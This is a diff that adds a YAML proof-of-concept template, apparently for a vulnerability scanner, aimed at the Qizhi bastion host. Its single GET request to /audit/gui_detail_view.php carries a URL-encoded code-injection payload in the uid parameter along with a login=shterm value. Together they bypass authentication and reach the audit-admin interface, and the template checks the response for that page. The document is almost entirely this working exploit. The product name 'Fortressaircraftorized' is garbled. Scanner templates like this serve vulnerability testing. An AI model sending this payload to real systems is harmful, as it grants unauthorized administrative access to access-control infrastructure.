@@ -1,0 +1,22 @@
+id: poc-yaml-qizhi-fortressaircraft-unauthorized
+info:
+  name: Qizhi Fortressaircraftorized 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: Qizhi Fortressaircraftorized
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "错误的id") && contains(body, "审计管理员")
+    && contains(body, "事件审计")
+  output: []
